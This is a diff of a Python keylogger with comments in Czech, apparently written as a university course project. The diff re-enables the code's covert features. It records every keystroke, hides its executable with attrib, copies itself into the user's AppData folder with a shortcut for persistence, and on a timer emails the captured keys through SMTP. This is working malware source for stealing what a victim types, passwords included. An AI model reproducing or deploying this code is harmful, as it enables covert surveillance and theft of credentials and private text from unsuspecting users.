@@ -10,9 +10,8 @@ from win32com.client import Dispatch    #pro vytvoreni zastupce
 from getpass import getuser     #pro ziskani uzivatelskeho jmena prihlaseneho uzivatele
 from threading import Timer     #pro dalsi vlakno pro casovac pro odesilani mailu
 
-log_file = "klog.txt"    #nazev souboru pro ukladani klaves    
-#file_path = "D:\\Škola\\UNOB\\7. semestr\\Vývoj a správa IS\\Python\\ProjektKeylogger\\"  #cesta k souboru pro ukladani klaves
-file_path=""
+log_file = "klog.txt"    #nazev souboru pro ukladani klaves - nevyuzivam    
+file_path = "D:\\Škola\\UNOB\\7. semestr\\Vývoj a správa IS\\Python\\ProjektKeylogger\\"  #cesta k souboru pro ukladani klaves - nevyuzivam
 
 username = getuser()    #ziskani uzivatelskeho jmena prihlaseneho uzivatele
 destination_path = f"C:\\Users\\{username}\\AppData\\"  #cesta do slozky pro ulozeni odchytavace
@@ -29,17 +28,17 @@ keys = []   #prazdne pole klaves
 
 
 def hideProgram():
-    #funkce pro samostatny presun a skryti skriptu
+    #funkce pro samostatny presun a skryti programu
     #current_destination = path.abspath(__file__)     #cesta ke skriptu
     current_destination = path.abspath(sys.argv[0])     #cesta k exe souboru
-    system("attrib +h " + f"{current_destination}")  #skryti souboru
+    system("attrib +h " + f"{current_destination}")  #skryti programu
     if not path.exists(shortcut_path + shortcut_name):  #kontrola, ze zastupce jeste nebyl vytvoren
         createHideShortcut()   
     if not path.exists(destination_path + program_name):    #kontrola, ze odchytavac jeste neni na svem miste - presune se pouze jednou
-        move(current_destination,destination_path + program_name)     #presun skriptu  
+        move(current_destination,destination_path + program_name)     #presun program  
         
 def createHideShortcut():
-    #vytvoreni zastupce 
+    #funkce pro vytvoreni a premisteni zastupce 
     shell = Dispatch('WScript.Shell')
     shortcut = shell.CreateShortCut(destination_path + shortcut_name)
     shortcut.Targetpath = (destination_path + program_name)
@@ -48,13 +47,21 @@ def createHideShortcut():
     move(destination_path + shortcut_name,shortcut_path + shortcut_name)     #presun zastupce
 
 def press(key):
+    #funkce slouzi pro odchytavani stisknutych klaves
     global keys
     print(key)      #vypis klavesu do konzole
-    key = format(key)
+    key = format(key) 
     keys.append(key)    #pripoj stisknutou klavesu do pole klaves
 
 def format(key):
-    #funkce pro naformatovani textu
+    """Funkce formatuje stisknute klavesy do citelnejsi podoby
+
+    Args:
+        key (Any): stisknuta klavesa
+    
+    Returns:
+        str: return naformatovanou klavesu
+    """
     formatted_key = ""
     #prirazeni specifickych hodnot urcitym klavesam
     keywords = {
@@ -79,16 +86,22 @@ def format(key):
                 formatted_key = k
         except:
             formatted_key = k
-    return formatted_key
+    return str(formatted_key)
 
 def write(formatted_keys):
-    #zapis do souboru pro ukladani klaves
+    #tuto funkci nevyuzivam, ale muze se hodit
+    #funkce pro zapis naformatovanych klaves do textoveho souboru
     with open(file_path + log_file, "a") as file:
         for key in formatted_keys:
             file.write(str(key))
 
 def mail(formatted_keys, formatted_now):
-    #funkce pro odesilani emailu
+    """Funkce pro odesilani emailu s odchycenymi klavesami
+	
+	Args:
+		formatted_keys (list): naformatovane stisknute klavesy
+        formatted_now (str): naformatovane datum a cas odeslani
+	"""
     message = MIMEMultipart()
     message['From'] = sender    #adresa odesilatele
     message['To'] = receiver    #adresa prijemce
@@ -103,12 +116,15 @@ def mail(formatted_keys, formatted_now):
     smtp.quit() #ukonceni relace
 
 def release(key):
+    #tuto funkci nevyuzivam, ale muze se hodit
+    #funkce umoznuje nastavit vypnuti odchytavace pri stisknuti urcite klavesy
     None
 #     #pri stisku Esc se vypne odchytavac
 #     if key == Key.esc:
 #         return False
 
 def measureTime():
+    #funkce meri cas a v danem intervalu vola funkci pro odeslani emailu
     global keys
     send_time = 3600     #interval pro odeslani emailu (43200 s = 12 h)
     now = datetime.now()    #ziska soucasne datum a cas
@@ -121,11 +137,12 @@ def measureTime():
     send_email.start()
 
 def listen():
-    with Listener(on_press = press, on_release = release) as listener:  #odecitani klavesy pri stisku a pri pusteni
+    #funkce pro odchytavani klavesy pri stisku a pri pusteni
+    with Listener(on_press = press, on_release = release) as listener:
         listener.join()
 
 if __name__ == "__main__":
-    #hideProgram()
-    #measureTime()
+    hideProgram()
+    measureTime()
     listen()
     
